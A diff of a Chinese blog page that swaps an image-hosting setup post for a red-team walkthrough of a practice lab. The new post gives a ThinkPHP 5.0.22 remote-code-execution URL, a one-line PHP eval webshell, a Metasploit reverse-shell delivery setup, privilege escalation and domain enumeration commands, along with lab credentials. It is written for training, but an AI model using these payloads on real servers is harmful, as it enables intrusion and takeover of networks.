@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>typora+PicGo+LskyPro+Obsidian实现文章管理 | 子夜旅馆</title>
-  <meta name="keywords" content=" blog ">
-  <meta name="description" content="typora+PicGo+LskyPro+Obsidian实现文章管理 | 子夜旅馆">
+  <title>ATT&amp;CK红队评估实战靶场五 | 子夜旅馆</title>
+  <meta name="keywords" content=" 靶场 ">
+  <meta name="description" content="ATT&amp;CK红队评估实战靶场五 | 子夜旅馆">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="子夜旅馆">
 <meta property="og:type" content="website">
@@ -458,11 +458,13 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-typora+PicGo+LskyPro+Obsidian实现文章管理" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-ATT-CK红队评估实战靶场五" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">typora+PicGo+LskyPro+Obsidian实现文章管理</h1>
+        <h1 class="article-title">ATT&amp;CK红队评估实战靶场五</h1>
     
     <div class="article-meta">
+        
+        <span class="top"><a>置顶</a></span>
         
         
         
@@ -470,7 +472,7 @@
             <i class="iconfont icon-category"></i>
             
             
-            <a  data-rel="杂文">杂文</a>
+            <a  data-rel="渗透">渗透</a>
             
         </span>
         
@@ -478,19 +480,19 @@
         <span class="tag">
             <i class="iconfont icon-tag"></i>
             
-            <a class="color5">blog</a>
+            <a class="color3">靶场</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2023-03-29 12:58:08'>2023-03-23 22:37</time>
+            发布时间 : <time class="date" title='最后更新: 2023-03-29 20:27:06'>2023-03-29 20:24</time>
         
     </div>
     <div class="article-meta">
         
-        <span>字数:328</span>
+        <span>字数:1.1k</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -509,7 +511,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#typora-PicGo-LskyPro-github-Obsidian"><span class="toc-text">typora+PicGo+LskyPro(github)+Obsidian</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">参考链接</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA"><span class="toc-text">搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E4%B8%8A%E4%BC%A0%E7%9A%84%E6%95%B4%E4%BD%93%E6%80%9D%E8%B7%AF"><span class="toc-text">图片上传的整体思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%AD%E5%BB%BA%E6%B5%81%E7%A8%8B"><span class="toc-text">搭建流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E6%9E%9C%E4%B8%8D%E6%83%B3%E7%94%A8%E8%87%AA%E5%BB%BA%E7%9A%84%E5%9B%BE%E5%BA%8A%E5%8F%AF%E4%BB%A5%E6%8D%A2%E6%88%90github%E5%9B%BE%E5%BA%8A"><span class="toc-text">如果不想用自建的图床可以换成github图床</span></a></li></ol></li></ol>
+        
     
 <style>
     .left-col .switch-btn,
@@ -525,69 +527,206 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="typora-PicGo-LskyPro-github-Obsidian"><a href="#typora-PicGo-LskyPro-github-Obsidian" class="headerlink" title="typora+PicGo+LskyPro(github)+Obsidian"></a>typora+PicGo+LskyPro(github)+Obsidian</h1><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><ol>
-<li>typora是一个Markdown格式的编辑器</li>
-<li>PicGo是一个自动上传图片到图床的工具</li>
-<li>LskyPro是一个图床</li>
-<li>Obsidian是一个.md文档整理关联工具</li>
+        <p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303292025019.jpeg" alt="img"></p>
+<ol>
+<li><p>环境信息</p>
+</li>
+<li><ol>
+<li>kali</li>
 </ol>
-<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
-<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xbd_zc/article/details/129423825">Lsky Pro搭建</a></p>
 </li>
-<li><p><a target="_blank" rel="noopener" href="https://www.tqwba.com/x_d/jishu/1210032.html">Lskypro搭建</a></p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2082694">Lsky Pro-V2-tocken获取</a></p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33957967/article/details/124572413">typora自动上传图片</a></p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://molunerfinn.com/PicGo/">PicGo官网</a></p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://picgo.github.io/PicGo-Doc/zh/guide/config.html#%E7%A6%BB%E7%BA%BF%E5%AE%89%E8%A3%85">PicGo手册</a></p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33957967/article/details/124572413">整体流程少一截</a></p>
-</li>
-<li><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1xq4y1m7es">功能介绍</a></p>
-<h1 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h1><h2 id="图片上传的整体思路"><a href="#图片上传的整体思路" class="headerlink" title="图片上传的整体思路"></a>图片上传的整体思路</h2></li>
-<li><p>typora向本地的36677端口发送图片上传的请求</p>
-</li>
-<li><p>PicGo默认监听本地36677端口，并将监听的数据以接口的形式发送到，指定Lskypro所在的图床，返回一个链接</p>
+<li><ol>
+<li><ol>
+<li>vm8:192.168.135.128</li>
+</ol>
 </li>
 </ol>
-<h2 id="搭建流程"><a href="#搭建流程" class="headerlink" title="搭建流程"></a>搭建流程</h2><ol>
-<li><p>下载并安装<a target="_blank" rel="noopener" href="https://nodejs.org/en">node.js</a></p>
 </li>
-<li><p>下载并安装<a target="_blank" rel="noopener" href="https://molunerfinn.com/PicGo/">PicGo</a></p>
+<li><ol>
+<li>win7</li>
+</ol>
 </li>
-<li><p>typora-偏好设置<br><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303211401092.png" alt="image-20230320201957552"></p>
+<li><ol>
+<li><ol>
+<li>vm8:192.168.135.150</li>
+<li>vm1:192.168.138.136</li>
+<li>sun\heart 123.com<br>sun\Administrator dc123.com</li>
+</ol>
 </li>
-<li><p>利用docker搭建skyPro</p>
-<pre><code class="docker">docker run -d --name lsky -p 8090:80 -v /var/project/lsky:/var/www/html halcyonazure/lsky-pro-docker:latest
+</ol>
+</li>
+<li><ol>
+<li>win2008-DC</li>
+</ol>
+</li>
+<li><ol>
+<li><ol>
+<li>vm1:192.168.138.138</li>
+<li>sun\admin 2020.com</li>
+</ol>
+</li>
+</ol>
+</li>
+<li><p>环境配置</p>
+</li>
+<li><ol>
+<li>win7上sun\Administrator dc123.com登录打开phpstudy，并关闭防火墙</li>
+</ol>
+</li>
+<li><p>主机发现</p>
+</li>
+<li><ol>
+<li>nmap -sP -T5 -f 192.168.135.1/24</li>
+<li>arp-scan -l</li>
+<li>masscan  –ports 22,80,443 –ping –open-only –range 192.168.135.1/24  –rate 1000000000000</li>
+<li>探测到目标主机ip为192.168.135.150</li>
+</ol>
+</li>
+<li><p>端口扫描</p>
+</li>
+<li><ol>
+<li>nmap -A -f -sV -p- 192.168.135.150</li>
+</ol>
+</li>
+</ol>
+<pre><code class="go">PORT      STATE SERVICE      VERSION
+80/tcp    open  http         Apache httpd 2.4.23 ((Win32) OpenSSL/1.0.2j PHP/5.5.38)
+|_http-server-header: Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.5.38
+|_http-title: Site doesn&#39;t have a title (text/html; charset=utf-8).
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: SUN)
+3306/tcp  open  mysql        MySQL (unauthorized)
+49152/tcp open  msrpc        Microsoft Windows RPC
+49153/tcp open  msrpc        Microsoft Windows RPC
+49154/tcp open  msrpc        Microsoft Windows RPC
+49155/tcp open  msrpc        Microsoft Windows RPC
+49156/tcp open  msrpc        Microsoft Windows RPC
+49384/tcp open  msrpc        Microsoft Windows RPC
+MAC Address: 00:0C:29:B1:0A:AF (VMware)
+Device type: general purpose
+Running: Microsoft Windows 7|2008|8.1
+OS CPE: cpe:/o:microsoft:windows_7::- cpe:/o:microsoft:windows_7::sp1 cpe:/o:microsoft:windows_server_2008::sp1 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_8.1
+OS details: Microsoft Windows 7 SP0 - SP1, Windows Server 2008 SP1, Windows Server 2008 R2, Windows 8, or Windows 8.1 Update 1
+Network Distance: 1 hop
+Service Info: Host: WIN7; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: -2h40m00s, deviation: 4h37m07s, median: 0s
+| smb2-security-mode: 
+|   2.1: 
+|_    Message signing enabled but not required
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_nbstat: NetBIOS name: WIN7, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:b1:0a:af (VMware)
+| smb-os-discovery: 
+|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
+|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
+|   Computer name: win7
+|   NetBIOS computer name: WIN7\x00
+|   Domain name: sun.com
+|   Forest name: sun.com
+|   FQDN: win7.sun.com
+|_  System time: 2022-05-13T08:48:04+08:00
+| smb2-time: 
+|   date: 2022-05-13T00:48:05
+|_  start_date: 2022-05-12T11:19:12
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.77 ms 192.168.135.150
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 88.05 seconds
 </code></pre>
-<p>数据库方面可以选sqite</p>
+<ol>
+<li><ol>
+<li>？？？咋这么多端口……</li>
+</ol>
 </li>
-<li><p>在PicGo中安装lankong 1.1.3<br><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303211401094.png" alt="image-20230320202551388"><br><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303211401898.png" alt="image-20230320203428385"></p>
+<li><p>web信息收集</p>
 </li>
-<li><p>利用postman获取tocken</p>
-<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303211401948.png" alt="image-20230309113816510"><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303211401135.png" alt="image-20230309113610967"><br>获得tocken “x|xxxx……xx”</p>
+<li><ol>
+<li>目录扫描</li>
+</ol>
 </li>
-<li><p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303211401575.png" alt="image-20230309122232246"></p>
-</li>
-<li><p>typora进行测试</p>
+<li><ol>
+<li><ol>
+<li>dirsearch -u <a target="_blank" rel="noopener" href="http://192.168.135.150/">http://192.168.135.150</a> -r -x 302,404,403 -t 128<br>发现add.php,乍一看像是不知道密码的webshell</li>
+<li><a target="_blank" rel="noopener" href="http://192.168.135.150/123%E8%AE%BF%E9%97%AE%E4%B8%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E7%9B%AE%E5%BD%95%EF%BC%8C%E7%88%86%E5%87%BA%E7%89%88%E6%9C%ACThinkphp">http://192.168.135.150/123访问不存在的目录，爆出版本Thinkphp</a> V5.0.22</li>
+</ol>
 </li>
 </ol>
-<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303211401610.png" alt="image-20230320204342515"></p>
-<p>图片上传成功即可</p>
-<p><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303211401394.png" alt="image-20230320204629678"></p>
-<p>改成这样即可成功，图片自动上传到图床</p>
-<h2 id="如果不想用自建的图床可以换成github图床"><a href="#如果不想用自建的图床可以换成github图床" class="headerlink" title="如果不想用自建的图床可以换成github图床"></a>如果不想用自建的图床可以换成github图床</h2><ol>
-<li>上传前将picgo设置为时间戳重命名<br><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303211403660.png" alt="image-20230321140338803"></li>
-<li>具体操作看</li>
+</li>
+<li><ol>
+<li>searchsploit  thinkphp<br>locate 46150.txt<br>cp /usr/share/exploitdb/exploits/php/webapps/46150.txt    ./<br><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303292026675.png" alt="img"><br><a target="_blank" rel="noopener" href="http://192.168.135.150/to/thinkphp_5.0.22/?s=index/%5Cthink%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=phpinfo&amp;vars%5B1%5D%5B%5D=1%E6%88%90%E5%8A%9F%E8%A7%A6%E5%8F%91phpinfo%E6%BC%8F%E6%B4%9E">http://192.168.135.150/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1成功触发phpinfo漏洞</a></li>
 </ol>
-<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Ui4y1x7Cq">https://www.bilibili.com/video/BV1Ui4y1x7Cq</a></p>
-<ol start="3">
-<li><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303211407551.png" alt="image-20230321140602222"></li>
+</li>
+<li><p>webshell上传</p>
+</li>
+<li><ol>
+<li><a target="_blank" rel="noopener" href="http://192.168.135.150/to/thinkphp_5.0.22/?s=index/%5Cthink%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=system&amp;vars%5B1%5D%5B%5D=dir">http://192.168.135.150/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=dir</a></li>
+<li><a target="_blank" rel="noopener" href="http://192.168.135.150/to/thinkphp_5.0.22/?s=index/%5Cthink%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=system&amp;vars%5B1%5D%5B%5D=echo">http://192.168.135.150/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo</a> “<?php @eval($_POST[whoami]);?>“ &gt; shell.php</li>
+<li>蚁剑连接<br><a target="_blank" rel="noopener" href="http://192.168.135.150/shell.php">http://192.168.135.150/shell.php</a></li>
+<li>看一下刚刚的add.php<br>$password = “2aefc34200a294a3cc7db81b43a81873”; //Viv, bebegim..<br>admins</li>
 </ol>
-<p>如果条件支持，建议在picgo上面设置代理，<a href="http://127.0.0.1:xxxxx">http://127.0.0.1:xxxxx</a></p>
+</li>
+<li><p>msf上线</p>
+</li>
+<li><ol>
+<li>use exploit/multi/script/web_delivery<br>set target 2    # 选择使用powershell类型的payload<br>set payload windows/meterpreter/reverse_tcp<br>set lhost 192.168.135.128<br>exploit</li>
+<li>蚁剑运行，msf上线</li>
+<li>getsystem<br>获得system权限</li>
+</ol>
+</li>
+<li><p>CS上线</p>
+</li>
+<li><ol>
+<li><img src="https://raw.githubusercontent.com/sunwu57/tuchuang/main/img/202303292026284.png" alt="img"></li>
+</ol>
+</li>
+<li><p>内网信息收集</p>
+</li>
+</ol>
+<pre><code class="go">ipconfig /all   # 查看本机ip，所在域
+route print     # 打印路由信息
+net view        # 查看局域网内其他主机名
+arp -a          # 查看arp缓存
+net start       # 查看开启了哪些服务
+net share       # 查看开启了哪些共享
+net share ipc$  # 开启ipc共享
+net share c$    # 开启c盘共享
+net use \\192.168.xx.xx\ipc$ &quot;&quot; /user:&quot;&quot;    # 与192.168.xx.xx建立空连接
+net use \\192.168.xx.xx\c$ &quot;密码&quot; /user:&quot;用户名&quot;    # 建立c盘共享
+dir \\192.168.xx.xx\c$\user    # 查看192.168.xx.xx c盘user目录下的文件
+
+net config Workstation    # 查看计算机名、全名、用户名、系统版本、工作站、域、登录域
+net user                 # 查看本机用户列表
+net user /domain         # 查看域用户
+net localgroup administrators    # 查看本地管理员组（通常会有域用户）
+net view /domain         # 查看有几个域
+net user 用户名 /domain   # 获取指定域用户的信息
+net group /domain        # 查看域里面的工作组，查看把用户分了多少组（只能在域控上操作）
+net group 组名 /domain    # 查看域中某工作组
+net time /domain           // 主域服务器会同时作为时间服务器
+net group &quot;domain admins&quot; /domain  # 查看域管理员的名字
+net group &quot;domain computers&quot; /domain  # 查看域中的其他主机名
+net group &quot;doamin controllers&quot; /domain  # 查看域控制器（可能有多台）
+net group &quot;Enterprise Admins&quot; /domain    // 查看域管理员组
+</code></pre>
+<ol>
+<li><ol>
+<li>内网网段138段，域为sun.com，以及一台域控DC，IP为192.168.138.138</li>
+</ol>
+</li>
+<li><p>建立监听，网络扫描，psexec64，然后就日穿了……</p>
+</li>
+<li><p>参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/zy15667076526/article/details/116132168">1</a><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42094992/article/details/117390965">2</a><a target="_blank" rel="noopener" href="https://blog.csdn.net/BuNahua/article/details/120098504">3</a></p>
+</li>
+</ol>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1210396142@qq.com </span>
